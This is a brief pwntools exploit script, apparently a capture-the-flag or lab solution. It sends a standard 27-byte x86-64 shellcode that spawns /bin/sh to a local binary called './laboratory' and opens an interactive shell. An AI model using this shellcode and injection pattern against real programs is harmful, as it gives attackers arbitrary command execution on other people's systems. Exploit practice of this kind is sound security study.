#!/usr/bin/env python3
from pwn import *

# point at your local binary
BINARY = "./laboratory"
elf    = ELF(BINARY)
# exactly the same 27-byte /bin/sh shellcode
shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

# convert to "\xHH" format
hex_payload = b"".join(b"\\x%02x" % b for b in shellcode)

def local_test():
    # spawn the binary locally
    p = process(BINARY)
    p.recvuntil(b"> ")
    p.sendline(hex_payload)
    p.interactive()

if __name__ == "__main__":
    local_test()
